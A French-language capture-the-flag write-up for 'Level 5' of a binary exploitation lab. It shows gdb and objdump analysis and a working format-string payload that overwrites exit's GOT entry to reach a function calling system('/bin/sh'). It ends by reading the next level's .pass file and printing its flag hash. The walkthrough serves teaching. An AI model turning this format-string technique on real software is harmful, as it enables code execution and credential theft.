# Level 5

Ce niveau ressemble aux deux précédents, à la différence qu'après le `printf` il appelle la function `exit`.  
En examinant l'asm on peut voir qu'il y a une fonction `o` pas utilisée, qui appelle `system("/bin/sh")`.

Quand on reverse `exit`, on voit que la function fait en réalité un `jmp` à une adresse. L'idée de notre exploit sera donc de modifier l'adresse du jump d'exit (dans la [*Global Offset Table*](https://en.wikipedia.org/wiki/Global_Offset_Table)) par l'adresse de la fonction `o`.  
`objdump -TR level5` nous donne l'adresse de `exit()` => `08049838`. `objdump -t level5 | grep o` nous donne l'adresse de `o` => `080484a4`.  

Les adresses du programme commençant toutes par `0x0804`, nous n'avons donc à modifier qu'une partie de l'adresse grâce à `printf`.  
La partie que nous devons réécrire est donc `84a4` (soit 33956 en décimal).

```shell
~ gdb level5
(gdb) disas main
Dump of assembler code for function main:
[...]
   0x0804850a <+6>:	call   0x80484c2 <n>
[...]
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
[...]
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) info func
All defined functions:

Non-debugging symbols:
[...]
0x080484a4  o
0x080484c2  n
0x08048504  main
[...]
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x18,%esp
   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
(gdb) quit
~ python -c 'print "\x38\x98\x04\x08" + "%33952x" + "%4$hn"' > /tmp/level5
~ cat /tmp/level5 - | ./level5
[...]
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```